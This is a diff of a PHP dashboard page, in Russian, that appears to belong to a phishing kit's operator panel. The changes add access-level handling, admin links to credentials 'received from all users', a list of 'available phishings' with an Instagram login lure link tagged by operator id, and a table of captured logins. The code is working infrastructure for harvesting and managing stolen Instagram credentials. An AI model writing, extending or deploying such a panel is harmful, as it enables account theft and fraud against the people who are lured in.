@@ -1,7 +1,6 @@
 <?php
 
-use \core\Controller;
-use \core\Model;
+use \core\{Controller, Model, FactoryAccess};
 
 $id = Controller::getAuth();
 
@@ -14,22 +13,37 @@ if(!$result) exit('Ошибка');
 $data = $stmt->fetchall(\PDO::FETCH_ASSOC);
 
 $id = $data[0]['id'];
+$_SESSION['access'] = $data[0]['access'];
+$access = $_SESSION['access'];
 
+$params = FactoryAccess::getParams($access);
 
 ?>
 
 
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <title></title>
 </head>
 <body>
     <a href="<?= Controller::url('logout') ?>">logout</a>
-    <a href="<?= Controller::url('change') ?>">Изменить пароль</a>
-    <h2><?= $data[0]['login']?></h2>
-    <p><?= Controller::getSet('instagram') . "?id=$id" ?></p>
+    <a href="<?= Controller::url('change') ?>">Изменить данные</a>
+    <?php if($params['all']): ?>
+        <a href="<?= Controller::url('all') ?>">Полученные данные всех пользователей</a>
+    <?php endif; ?>
+    <?php if($params['users']): ?>
+        <a href="<?= Controller::url('users') ?>">Все пользователи</a>
+    <?php endif; ?>
+
+    <h1><?= $data[0]['login']?></h1>
+    <h2>Уровень доступа: <?= $access ?></h2>
+    <br />
+    <h2>Доступные фишинги:</h2>
+    <p>Вход в инстаграм - <?= Controller::getSet('instagram') . "?id=$id" ?></p>
+    <br />
+    <h2>Полученные данные</h2>
     <table>
         <tr>
             <td>Логин</td>
